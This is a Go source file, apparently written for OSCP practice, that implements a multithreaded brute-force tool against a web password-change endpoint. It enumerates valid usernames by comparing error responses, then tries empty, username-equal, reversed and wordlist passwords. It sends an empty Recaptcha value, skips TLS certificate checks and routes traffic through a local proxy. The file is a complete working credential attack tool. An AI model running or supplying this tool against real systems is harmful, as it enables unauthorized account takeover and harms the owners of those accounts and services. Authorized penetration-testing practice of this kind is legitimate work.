package main

import (
	"bufio"
	"context"
	//"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	//"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"crypto/tls"
)

func main() {
	//bruteUserMain()
	brutePasswordMain()
}

///// login brute

func bruteUserMain() {
	// target url
	targetUrl := os.Args[1]

	// file name for enumeration
	fileName := os.Args[2]

	// number of threads
	threads, err := strconv.Atoi(os.Args[3])
	fatalIfErr(err)

	// create worker pool
	wp, producerCh := NewWorkerPool(threads, targetUrl, bruteUser)

	// read wordlist (producer)
	go fileBufferedReader(fileName, producerCh)

	// start worker pool
	wp.Work()
}

func brutePasswordMain() {
	// target url
	targetUrl := os.Args[1]

	// wordlists for enumeration
	fileNameUsers := os.Args[2]
	fileNamePasswords := os.Args[3]

	// number of threads
	threads, err := strconv.Atoi(os.Args[4])
	fatalIfErr(err)

	// create worker pool
	wp, producerCh := NewWorkerPool(threads, targetUrl, brutePassword)

	// read user and password lists (producer)
	go userAndPasswordBufferedReader(fileNameUsers, fileNamePasswords, producerCh)

	// start worker pool
	wp.Work()
}

func bruteUser(toorbnny *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc) {
	user := payload["default"]
	username := fmt.Sprintf("%s@oscp.exam", user)
	response := postChangePassword(toorbnny, url, username, "ESMWaterP1p3S!")
	
	// check response
	body := string(*response.Body)
	invalidUserError := `{"errors":[{"errorCode":3,"fieldName":null,"message":null}],"payload":null}`
	invalidPasswordError := `{"errors":[{"errorCode":0,"fieldName":null,"message":"Unknown error (0x80005000)"}],"payload":null}`
	if body != invalidUserError && body != invalidPasswordError {
		fmt.Println(user)
		// fmt.Printf("user=%s\tresponse=%s\n", user, body)
	}
}

func brutePassword(toorbnny *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc) {
	username := fmt.Sprintf("%s@oscp.exam", payload["user"])
	password := payload["password"]
	response := postChangePassword(toorbnny, url, username, password)

	// check response
	body := string(*response.Body)
	invalidPasswordError := `{"errors":[{"errorCode":0,"fieldName":null,"message":"Unknown error (0x80005000)"}],"payload":null}`
	if password != "" && body != invalidPasswordError {
		fmt.Printf("username=%s\tpassword=%s\tresponse=%s\n", username, password, body)
	}
}

func postChangePassword(toorbnny *ToorBnny, fullUrl, username, password string) *Response {
	// request headers
	headers := http.Header{}
	headers.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
	headers.Set("Referer", fullUrl)
		
	// form data
	data := url.Values{}
	data.Add("Username", username)
	data.Add("CurrentPassword", password)
	data.Add("NewPassword", password)
	data.Add("NewPasswordVerify", password)
	data.Add("Recaptcha", "")
	encodedData := JsonBodyEncoder(data, headers)
		
	// post response
	response, err := toorbnny.Post(fullUrl, headers, encodedData)
	fatalIfErr(err)

	return response
}

///// util

func payloadGenerator(payload string) []string {
	escaped := url.QueryEscape(payload)
	return []string{ 
		escaped, 
		escaped + "/", 
		escaped + ".txt",
		escaped + ".php",
	}
}

func fileBufferedReader(fileName string, ch chan<- map[string]string) {
	file, err := os.Open(fileName)
	fatalIfErr(err)
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		payload := map[string]string{ "default": line}
		ch <- payload
	}
	fatalIfErr(scanner.Err())

	close(ch)
}

func userAndPasswordBufferedReader(fileNameUsers string, fileNamePasswords string, ch chan<- map[string]string) {
	defer close(ch)
	var payload map[string]string
	counter := 0
	
	fileUsers, err := os.Open(fileNameUsers)
	fatalIfErr(err)
	scannerUsers := bufio.NewScanner(fileUsers)
	for scannerUsers.Scan() {
		user := scannerUsers.Text()

		// empty password
		payload = map[string]string{ "user": user, "password": ""}
		ch <- payload

		// username as password
		payload = map[string]string{ "user": user, "password": user}
		ch <- payload

		// rev username as password
		payload = map[string]string{ "user": user, "password": reverse(user)}
		ch <- payload
	}
	fatalIfErr(scannerUsers.Err())
	fileUsers.Close()
	
	filePasswords, err2 := os.Open(fileNamePasswords)
	fatalIfErr(err2)
	defer filePasswords.Close()

	scannerPasswds := bufio.NewScanner(filePasswords)
	for scannerPasswds.Scan() {
		password := scannerPasswds.Text()

		counter += 1
		if counter % 100000 == 0 {
			fmt.Println(counter, password)
		}
		
		fileUsers, err = os.Open(fileNameUsers)
		fatalIfErr(err)

		scannerUsers = bufio.NewScanner(fileUsers)
		for scannerUsers.Scan() {
			user := scannerUsers.Text()
			
			payload = map[string]string{ "user": user, "password": password}
			ch <- payload
		}
		fatalIfErr(scannerUsers.Err())
		fileUsers.Close()
	}
	fatalIfErr(scannerPasswds.Err())
}

func reverse(str string) (result string) {
    for _, v := range str {
        result = string(v) + result
    }
    return
}

func fatalIfErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

///// lib
type ToorBnny struct {
	*http.Client
}

type WorkerPool struct {
	context context.Context
	cancelFunc context.CancelFunc
	numWorkers int
	producerCh chan map[string]string
	url string
	workFunc WorkFunc
	waitGroup *sync.WaitGroup
}

type Response struct {
	*http.Response
	Body    *[]byte
	Latency float64
}

type WorkFunc func(t *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc)

func NewToorBnny() *ToorBnny {
	proxyStr := "http://localhost:8081"
	proxyUrl, err := url.Parse(proxyStr)
	fatalIfErr(err)

	transport := &http.Transport{
		MaxIdleConns:       40,
		IdleConnTimeout:    15 * time.Second,
		DisableCompression: true,
		Proxy:              http.ProxyURL(proxyUrl),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	jar, err := cookiejar.New(nil)
	fatalIfErr(err)

	toorbnny := &ToorBnny{
		&http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Timeout:   15 * time.Second,
			Transport: transport,
			Jar:       jar,
		},
	}

	return toorbnny
}

func NewWorkerPool(numWorkers int, url string, workFunc WorkFunc) (*WorkerPool, chan map[string]string) {
	ctx, cancelFunc := context.WithCancel(context.Background())
	producerCh := make(chan map[string]string, numWorkers)
	waitGroup := new(sync.WaitGroup)

	workerPool := &WorkerPool{
		context: ctx,
		cancelFunc: cancelFunc,
		numWorkers: numWorkers,
		producerCh: producerCh,
		url: url,
		waitGroup: waitGroup,
		workFunc: workFunc,
	}

	return workerPool, producerCh
}

func (w WorkerPool) Work() {
	defer w.waitGroup.Wait()

	for i := 0; i < w.numWorkers; i++ {
		w.waitGroup.Add(1)
		go w.worker()
	}
}

func FormBodyEncoder(values url.Values, headers http.Header) io.Reader {
	encodedData := values.Encode()
	body := strings.NewReader(string(encodedData))
	headers.Set("Content-Type", "application/x-www-form-urlencoded")
	return body
}

func JsonBodyEncoder(values url.Values, headers http.Header) io.Reader {
	payload := make(map[string]interface{})
	for k,v := range values {
		if len(v) == 1 {
			payload[k] = v[0]
		} else {
			payload[k] = v
		}
	}

	encodedData, err := json.Marshal(payload)
	fatalIfErr(err)

	body := strings.NewReader(string(encodedData))
	headers.Set("Content-Type", "application/json")
	return body
}

func (t ToorBnny) Get(url string, headers http.Header) (*Response, error) {
	return t.doRequest(http.MethodGet, url, headers, nil)
}

func (t ToorBnny) Head(url string, headers http.Header) (*Response, error) {
	return t.doRequest(http.MethodHead, url, headers, nil)
}

func (t ToorBnny) Post(url string, headers http.Header, data io.Reader) (*Response, error) {
	return t.doRequest(http.MethodPost, url, headers, data)
}

func (t ToorBnny) doRequest(method, url string, headers http.Header, data io.Reader) (*Response, error) {
	// create request
	request, err := http.NewRequest(method, url, data)
	if err != nil {
		return nil, err
	}

	// add headers
	for k, h := range headers {
		for _, v := range h {
			request.Header.Add(k, v)
		}
	}

	addIfNotExists(request.Header, "Accept", "*/*")
	addIfNotExists(request.Header, "Accept-Encoding", "*")

	// do request
	start := time.Now()
	response, err := t.Do(request)
	latency := time.Since(start).Seconds()
	if err != nil {
		return nil, err
	}

	// read response
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return nil, err
	}

	return &Response{
		Response: response,
		Body:     &body,
		Latency:  latency,
	}, nil
}

func (w WorkerPool) worker() {
	defer w.waitGroup.Done()
	toorbnny := NewToorBnny()
	
	for payload := range w.producerCh {
		select {
		case <-w.context.Done():
			fmt.Println("Done, exit")
			break
		default:
			// reset the cookie jar to prevent previous requests from interfering with future requests
			jar, err := cookiejar.New(nil)
			fatalIfErr(err)
			toorbnny.Jar = jar
			
			w.workFunc(toorbnny, w.url, payload, w.cancelFunc)
		}
	}
}

func addIfNotExists(headers http.Header, key, value string) {
	if _, ok := headers[key]; !ok {
		headers.Add(key, value)
	}
}
